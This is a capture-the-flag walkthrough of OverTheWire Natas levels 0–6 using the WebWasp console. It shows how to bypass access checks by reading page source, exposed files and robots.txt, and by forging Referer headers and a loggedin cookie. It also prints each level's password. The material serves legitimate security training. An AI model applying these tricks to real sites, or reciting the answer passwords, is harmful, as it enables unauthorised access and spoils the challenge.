# OverTheWire Natas Walkthrough

This guide provides a walkthrough of the OverTheWire Natas challenges.

You can check out OverTheWire's [website](https://overthewire.org/wargames/natas/) to try it for yourself!

All of these challenges are centered around web and serverside security, making WebWasp a perfect tool to throw at it.

The intent for this walkthrough is to demonstrate WebWasp's abilities in a "real-world" setting.

## Contents

- [Level 0](#level-0) (Basic authentication)
- [Level 1](#level-1) (More authentication)
- [Level 2](#level-2) (Finding links)
- [Level 3](#level-3) (robots.txt)
- [Level 4](#level-4) (The referer header)
- [Level 5](#level-5) (Cookies! 🍪)
- [Level 6](#level-6) (Our first POST request)
- [Level 7](#level-7) 

## Level 0

Level 0 is the only level that gives us a username and password right off the bat.

We'll have to find the passwords for future levels within the challenges.

On the website for level 0, it reads:

```
Start here:

Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

Completing this level is easy enough without a tool like WebWasp, but we'll show both ways to do it!

Let's do it the old fashioned way first, then show how we can complete it with WebWasp.

In a web browser, we can navigate to that link. Going there will instantly prompt us for those credentials:

| ![alt text](/./imgs/natas_1.PNG "natas0") |
|:--:|

We'll enter `natas0` for both the username and password fields, which will
get us to the site:

| ![alt text](/./imgs/natas_2.PNG "natas0") |
|:--:|

From here, we can right-click and press `View Page Source` to see the source of the webpage.

Within the source, we can find this HTML comment:

```
<!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->
```

And the level is complete!

Now let's try this in WebWasp! Fire up the WebWasp console by typing:

```
python3 webwasp.py
```

If we have any saved session data, let's go ahead and clear that with:

```
> reset
```

Just to track our progress, let's save that level 0 password in a variable:

```
> var add pass0 natas0
[🐝] Added variable:
   $pass0 -> 'natas0'
```

Let's also save the URL for later:

```
> var add url0 http://natas0.natas.labs.overthewire.org/
[🐝] Added variable:
   $url0 -> 'http://natas0.natas.labs.overthewire.org/'
```

Now let's try to make a GET request to the webpage:

```
> get $url0
[🐝] Sending GET request to http://natas0.natas.labs.overthewire.org/...
[🐝] GET request completed. Status code: 401 (Unauthorized)
[🐝] Response captured! Type 'response show' for summary
```

As we expect, we never provided any credentials to the page! So it returned a status code of `401`, which means we were unauthorized.

This authorization is part of the HTTP Authorization header. The server will check the credentials we provide there, and decide whether we are authorized or not.

We can provide those credentials in our GET request by first setting these header fields with our credentials.

First, let's take a look at the header fields by running the `headers` command:

```
> headers
[🐝] Current header fields:
   auth-pass    : ''
   auth-user    : ''
   referer      : ''
   user-agent   : ''
   -- truncated --
```

The `auth-user` and `auth-pass` are exactly what we're looking for! Let's set those:

```
> headers set auth-user natas0
[🐝] Set header field:
   auth-user : 'natas0'
> headers set auth-pass $pass0 
[🐝] Set header field:
   auth-pass : 'natas0'
```

(notice we set the `auth-pass` field with the variable we saved in `$pass0`).

Any headers we've set will automatically be shipped with our requests! So let's try it again:

```
> get $url0                   
[🐝] Sending GET request to http://natas0.natas.labs.overthewire.org/...
[🐝] GET request completed. Status code: 200 (OK)
[🐝] Response captured! Type 'response show' for summary
```

Success! This time we got a `200` status code, indicating a successful request!

Let's check out the page source:

```HTML
> response show -t  
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas0", "pass": "natas0" };</script></head>
<body>
<h1>natas0</h1>
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->
</div>
</body>
</html>
```

This source is identical to the page source we saw when going through the browser. And that same comment with the password for the next level is here too!

Let's save it in another variable for later:

```
> var add pass1 g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
[🐝] Added variable:
   $pass1 -> 'g9D9cREhslqBKtcA2uocGHPfMZVzeFK6'
```

And we're all done with level 0!

## Level 1

Let's take a look at level 1 in the browser first. We'll navigate to the same link as before, replacing the `0` in the URL with a `1`.

We'll provide `natas1` as the username this time, and the password from the previous level.

When we log in, we'll be met with this text:

```
You can find the password for the next level on this page, but rightclicking has been blocked!
```

Of course, there are a multitude of ways to solve this issue, but let's do it within WebWasp!

Let's first update our credentials in the headers:

```
> headers set auth-user natas1
[🐝] Set header field:
   auth-user : 'natas1'
> headers set auth-pass $pass1
[🐝] Set header field:
   auth-pass : 'g9D9cREhslqBKtcA2uocGHPfMZVzeFK6'
```

and then make the request:

```
> get http://natas1.natas.labs.overthewire.org
[🐝] Sending GET request to http://natas1.natas.labs.overthewire.org/...
[🐝] GET request completed. Status code: 200 (OK)
[🐝] Response captured! Type 'response show' for summary
```

Another success! Let's checkout out the source:

```HTML
> response show -t
<html>
<head>
-- truncated head section --
</head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
<h1>natas1</h1>
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 -->
</div>
</body>
</html>
```

And we've found the password again! We were able to bypass the right-click blocking by requesting the source directly.

We'll make a habit of saving these passwords as we find them. Since variables are saved between our WebWasp sessions, we can exit the program and pick it back up again whenever without losing any progress!

```
> var add pass2 h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
[🐝] Added variable:
   $pass2 -> 'h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7'
```

## Level 2

Let's set the headers again for the next level:

```
> headers set auth-user natas2
[🐝] Set header field:
   auth-user : 'natas2'
> headers set auth-pass $pass2
[🐝] Set header field:
   auth-pass : 'h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7'
```

<b>Note:</b> In future levels we won't show the headers being set, since it's the same process each time.

We'll make our get request:

```
> get http://natas2.natas.labs.overthewire.org  
[🐝] Sending GET request to http://natas2.natas.labs.overthewire.org/...
[🐝] GET request completed. Status code: 200 (OK)
[🐝] Response captured! Type 'response show' for summary
```

and view the source:

```HTML
> response show -t
<html>
<head>
-- truncated head section --
</head>
<body>
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
</body></html>
```

Unfortunately this time, there's no comment with the next level's password directly in the source 🙁.

However, we do see a link to an image in a directory called `files`.

Let's check out that directory. We'll add `/files` onto the end of our get request URL:

```
> get http://natas2.natas.labs.overthewire.org/files
[🐝] Sending GET request to http://natas2.natas.labs.overthewire.org/files...
[🐝] GET request completed. Status code: 200 (OK)
[🐝] Response captured! Type 'response show' for summary
```

```HTML
> response show -t
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /files</title>
 </head>
 <body>
<h1>Index of /files</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="pixel.png">pixel.png</a></td><td align="right">2023-10-05 06:15  </td><td align="right">303 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2023-10-05 06:15  </td><td align="right">145 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.52 (Ubuntu) Server at natas2.natas.labs.overthewire.org Port 80</address>
</body></html>
```

From the header, this looks like an index of files. Take a second to check out each entry. This line certainly looks interesting:

```HTML
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2023-10-05 06:15  </td><td align="right">145 </td><td>&nbsp;</td></tr>
```

This is linking a file called `users.txt` within the `files` directory. Let's check it out!

If we wanted to, we can also search specifically for links within our response by using a `find` command:

```
> response find --links
[🐝] Find results:
-- truncated --
/
pixel.png
users.txt
```

So let's checkout out that `txt` file by making another get request:

```
> get http://natas2.natas.labs.overthewire.org/files/users.txt
[🐝] Sending GET request to http://natas2.natas.labs.overthewire.org/files/users.txt...
[🐝] GET request completed. Status code: 200 (OK)
[🐝] Response captured! Type 'response show' for summary
```

```
> response show -t
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

Perfect! Along with a few other credentials, we find the ones we're looking for:

```
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
```

```
> var add pass3 G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
[🐝] Added variable:
   $pass3 -> 'G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q'
```

## Level 3

After updating our headers like before, and making our get request to the next URL, we find this source:

```HTML
> response show -t
<html>
<head>
-- truncated --
</head>
<body>
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
</body></html>
```

An interesting comment... Not even Google will find it. What could this be referencing?

To tell search engines like google what they are allowed and disallowed to index during a search, a site can provide a standardized file called the `robots.txt` file.

This file sets specific rules for the web crawlers that search engines use.

Let's go ahead and see if this server is using one of these files:

```
> get http://natas3.natas.labs.overthewire.org/robots.txt
```
```
> response show -t
User-agent: *
Disallow: /s3cr3t/
```

Awesome! We were able to pull that site's `robots.txt` file and see the contents.

It looks like the site doesn't want web crawlers to see anything within a directory called `/s3cr3t`.

While that might stop google, that certainly won't stop us! Let's send a get request to that directory:

```
> get http://natas3.natas.labs.overthewire.org/s3cr3t/
```
```HTML
> response show -t
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /s3cr3t</title>
 </head>
 <body>
<h1>Index of /s3cr3t</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2023-10-05 06:15  </td><td align="right"> 40 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.52 (Ubuntu) Server at natas3.natas.labs.overthewire.org Port 80</address>
</body></html>
```

And run a find for links...

```
> response find --links
[🐝] Find results:
-- truncated --
/
users.txt
```

Another `users.txt` file within the `s3cr3t` directory! Ours for the taking:

```
> get http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```
```
> response show -t
natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
```

Save the password in a variable called `pass4` and we're done!

## Level 4

Same process as before. Let's check out the source for this level:

```HTML
<html>
<head>
-- truncated --
</head>
<body>
<h1>natas4</h1>
<div id="content">

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

Hmm. This time we were disallowed access because we weren't coming from the right link...

What this is referencing is the `referer` tag within the header of an HTTP request.

WebWasp makes setting these header fields easy, as we've already seen with the `auth-user` and `auth-pass` fields.

Let's set the `referer` field the same way:

```
> headers set referer http://natas5.natas.labs.overthewire.org/
[🐝] Set header field:
   referer : 'http://natas5.natas.labs.overthewire.org/'
```

and try again:

```
> get http://natas4.natas.labs.overthewire.org/                
[🐝] Sending GET request to http://natas4.natas.labs.overthewire.org/...
[🐝] GET request completed. Status code: 200 (OK)
[🐝] Response captured! Type 'response show' for summary
```
```HTML
> response show -t
<html>
<head>
-- truncated --
</head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

Too easy! WebWasp makes crafting header fields very simple.

Save that password into `pass5` and we're onto the next one.

## Level 5

Since we don't necessarily want to use the same `referer` tag from the previous level, let's go ahead and unset it before we make our get request to level 5:

```
> headers unset referer 
[🐝] Unset header field:
   referer
```

Now once we update our auth headers, we're good to go and make our get request again.

```
> get http://natas5.natas.labs.overthewire.org/ 
```
```HTML
> response show -t
<html>
<head>
-- truncated --
</head>
<body>
<h1>natas5</h1>
<div id="content">
Access disallowed. You are not logged in</div>
</body>
</html>
```

Not logged in... I thought we logged in with the auth credentials!

Well if those had failed, the site would've returned us another `401` status code, but we got a `200`! So what gives?

There must be some other check going on here that pertains to a log in.

Many times, a session id or login is stored within a sites _cookies_ 🍪. Cookies are small bits of information that are typically stored within your browser.

Your browser will pass these cookies to sites to help remember things like your login or certain passwords!

We can inspect the cookies we received from the get request by using the response command with a new option:

```
> response show -c
[🐝] Response cookies:
   loggedin     : 0
```

Sure enough, this site uses a cookie called `loggedin`! This tells us that the `loggedin` value we provided was `0`. Maybe we need to set this to something non-zero to trick the website into thinking we're logged in!

We can do this by using WebWasp's `cookies` command. We'll go ahead and add a cookie with the same name as in the response, with a value of `1` instead of `0`:

```
> cookies add loggedin 1
[🍪] Added cookie:
   'loggedin' : '1'
```

Now when we make our get request again, this cookie will be passed along with it, just like our headers!

```
> get http://natas5.natas.labs.overthewire.org/
[🐝] Sending GET request to http://natas5.natas.labs.overthewire.org/...
[🐝] GET request completed. Status code: 200 (OK)
[🐝] Response captured! Type 'response show' for summary
```
```HTML
> response show -t
<html>
<head>
-- truncated --
</head>
<body>
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR</div>
</body>
</html>
```

Boom! We've successfully passed our custom-baked cookie to satisfy the site's requirement.

Save the password into `pass6` and we'll press on!

# Level 6

Before making our get request to level 6, let's clear our cookie from last level:

```
> cookies remove loggedin
[🍪] Removed cookie:
   'loggedin'
```
or
```
> cookies clear
[🍪] Stored cookies cleared
```

Now let's update the auth headers and make the next request:

```HTML
<html>
<head>
-- truncated --
</head>
<body>
<h1>natas6</h1>
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

A couple new things to notice in this level's source. First, we see there's a form here:

```HTML
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>
```

Secondly, we see there's a link just below it:

```HTML
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

The form enables a user to fill out some input and submit is using an HTTP POST request.

We can interact with this form by using a feature of WebWasp we haven't seen yet in this walkthrough: The `post` command!

Let's take a look at this usage of `post`:

```
> post -h
usage: post [-h] url [params [params ...]]

Send an HTTP POST request to a server/url

positional arguments:
  url         The url to make a request to
  params      Parameters from params to send with post request

optional arguments:
  -h, --help  Show this help message
```

The syntax here is similar to that of the `get` command we've been using, in that we supply a URL to operate against.

The `params` argument within the `post` command is where the difference lies. We first need to create `params` with given values using the `params` command, then pass those into the `post` command to form a succinct POST request.

But what parameters do we need to supply? Let's look again at the form:

```HTML
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>
```

For starters, we one input field:

```HTML
Input secret: <input name=secret>
```

The `name=secret` tag here indicates the parameter name we need to supply in the POST request. Let's make that now with a random value:

```
> params add secret "random"
[🐝] Added param:
   'secret' : 'random'
```

The other field in this form is here:

```HTML
<input type=submit name=submit>
```

From the tag `type=submit`, we know this is a button to actually perform the submittal of the form. And from the `name=submit` tag, we know this field is also named `submit`.

For HTML forms, so long as the a `type=submit` field gets any kind of value, the form will submit. Let's add that now:

```
> params add submit "any"
[🐝] Added param:
   'submit' : 'any'
```

Now let's try to make a POST request. Following the syntax of the `post` command, we provide the URL, and then the parameter names we added that we want to submit along with the request:

```
> post http://natas6.natas.labs.overthewire.org/ secret submit
[🐝] Sending POST request to http://natas6.natas.labs.overthewire.org/...
POST request made with parameters:
   'secret' : 'random'
   'submit' : 'any'
[🐝] POST request completed. Status code: 200 (OK)
[🐝] Response captured! Type 'response show' for summary
```

Let's see the response!

```HTML
<html>
<head>
-- truncated --
</head>
<body>
<h1>natas6</h1>
<div id="content">

Wrong secret
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Welp, look's like our post request submitted! But we submitted the wrong secret. This isn't surprising since we just put a random value in as the `secret` parameter.

Let's take a look at that link and maybe that will shed some light as to what we may need to enter as the secret:

Note that we specify the `--no-params` flag along with our get request, since we don't want to send along those parameters we just created.

```
> get http://natas6.natas.labs.overthewire.org/index-source.html --no-params
[🐝] Sending GET request to http://natas6.natas.labs.overthewire.org/index-source.html...
[🐝] GET request completed. Status code: 200 (OK)
[🐝] Response captured! Type 'response show' for summary
```

and we get...

```HTML
> resp show -t
<code><span style="color: #000000">
&lt;html&gt;<br />&lt;head&gt;<br />&lt;!--&nbsp;This&nbsp;stuff&nbsp;in&nbsp;the&nbsp;header&nbsp;has&nbsp;nothing&nbsp;to&nbsp;do&nbsp;with&nbsp;the&nbsp;level&nbsp;--&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;type="text/css"&nbsp;href="http://natas.labs.overthewire.org/css/level.css"&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/jquery-ui.css"&nbsp;/&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/wechall.css"&nbsp;/&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-ui.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/wechall.js"&gt;&lt;/script&gt;<br />&lt;script&gt;var&nbsp;wechallinfo&nbsp;=&nbsp;{&nbsp;"level":&nbsp;"natas6",&nbsp;"pass":&nbsp;"&lt;censored&gt;"&nbsp;};&lt;/script&gt;&lt;/head&gt;<br />&lt;body&gt;<br />&lt;h1&gt;natas6&lt;/h1&gt;<br />&lt;div&nbsp;id="content"&gt;<br /><br /><span style="color: #0000BB">&lt;?<br /><br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">"includes/secret.inc"</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">array_key_exists</span><span style="color: #007700">(</span><span style="color: #DD0000">"submit"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">$secret&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">[</span><span style="color: #DD0000">'secret'</span><span style="color: #007700">])&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">"Access&nbsp;granted.&nbsp;The&nbsp;password&nbsp;for&nbsp;natas7&nbsp;is&nbsp;&lt;censored&gt;"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">"Wrong&nbsp;secret"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /></span><span style="color: #0000BB">?&gt;<br /></span><br />&lt;form&nbsp;method=post&gt;<br />Input&nbsp;secret:&nbsp;&lt;input&nbsp;name=secret&gt;&lt;br&gt;<br />&lt;input&nbsp;type=submit&nbsp;name=submit&gt;<br />&lt;/form&gt;<br /><br />&lt;div&nbsp;id="viewsource"&gt;&lt;a&nbsp;href="index-source.html"&gt;View&nbsp;sourcecode&lt;/a&gt;&lt;/div&gt;<br />&lt;/div&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br /></span>
</code>
```

...oh boy. That doesn't look very pleasant. This is a classic example of source that doesn't decode HTML entities.

HTML entities are those freaky looking things throughout the above response that start with an `&` and end with a `;`. Typically these are decoded for us by the server, but it looks like we're viewing some raw source.

Not to worry! We can use WebWasp's `beautify` feature to make this look a little nicer:

```
> response beautify 
[🐝] Beautifying response text...
   Ran prettify.
   Made 174 entity decodes.
```

Let's take a look now:

```HTML
> response show -t
<code>
 <span style="color: #000000">
  <html>
   <br/>
   <head>
    --truncated --
   </head>
   <br/>
   <body>
    <br/>
    <h1>
     natas6
    </h1>
    <br/>
    <div id="content">
     <br/>
     <br/>
     <span style="color: #0000BB">
      <?<br />
      <br/>
     </span>
     <span style="color: #007700">
      include
     </span>
     <span style="color: #DD0000">
      "includes/secret.inc"
     </span>
     <span style="color: #007700">
      ;
      <br/>
      <br/>
      if(
     </span>
     <span style="color: #0000BB">
      array_key_exists
     </span>
     <span style="color: #007700">
      (
     </span>
     <span style="color: #DD0000">
      "submit"
     </span>
     <span style="color: #007700">
      ,
     </span>
     <span style="color: #0000BB">
      $_POST
     </span>
     <span style="color: #007700">
      )) {
      <br/>
      if(
     </span>
     <span style="color: #0000BB">
      $secret
     </span>
     <span style="color: #007700">
      ==
     </span>
     <span style="color: #0000BB">
      $_POST
     </span>
     <span style="color: #007700">
      [
     </span>
     <span style="color: #DD0000">
      'secret'
     </span>
     <span style="color: #007700">
      ]) {
      <br/>
      print
     </span>
     <span style="color: #DD0000">
      "Access granted. The password for natas7 is
      <censored>
       "
      </censored>
     </span>
     <span style="color: #007700">
      ;
      <br/>
      } else {
      <br/>
      print
     </span>
     <span style="color: #DD0000">
      "Wrong secret"
     </span>
     <span style="color: #007700">
      ;
      <br/>
      }
      <br/>
      }
      <br/>
     </span>
     <span style="color: #0000BB">
      ?&gt;
      <br/>
     </span>
     <br/>
     <form method="post">
      <br/>
      Input secret:
      <input name="secret"/>
      <br/>
      <br>
       <input name="submit" type="submit"/>
       <br/>
      </br>
     </form>
     <br/>
     <br/>
     <div id="viewsource">
      <a href="index-source.html">
       View sourcecode
      </a>
     </div>
     <br/>
    </div>
    <br/>
   </body>
   <br/>
  </html>
  <br/>
 </span>
</code>
```

Definitely much more readable now. Taking a closer inspection of the source, it looks like it's using `php` to include a file: `includes/secret.inc`.

It's then comparing the field `secret` from that file to the field `secret` that we submitted with our post request.

So let's take a look at that file!

```
> get http://natas6.natas.labs.overthewire.org/includes/secret.inc --no-params
[🐝] Sending GET request to http://natas6.natas.labs.overthewire.org/includes/secret.inc...
[🐝] GET request completed. Status code: 200 (OK)
[🐝] Response captured! Type 'response show' for summary
```
```PHP
> resp show -t
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Easy enough! Let's edit our parameter to match this secret value:

```
> params add secret FOEIUWGHFEEUHOFUOIU
[🐝] Added param:
   'secret' : 'FOEIUWGHFEEUHOFUOIU'
```

Now let's try to POST again!

```
> post http://natas6.natas.labs.overthewire.org/ secret submit                
[🐝] Sending POST request to http://natas6.natas.labs.overthewire.org/...
POST request made with parameters:
   'secret' : 'FOEIUWGHFEEUHOFUOIU'
   'submit' : 'any'
[🐝] POST request completed. Status code: 200 (OK)
[🐝] Response captured! Type 'response show' for summary
```
```HTML
> resp show -t
<html>
<head>
-- truncated --
</head>
<body>
<h1>natas6</h1>
<div id="content">

Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

And there we go! We provided the right value for the `secret` field of the POST request, and it gave us the password!

Let's store it in `pass7` and continue.

## Level 7

---

[Back to Top](#contents)
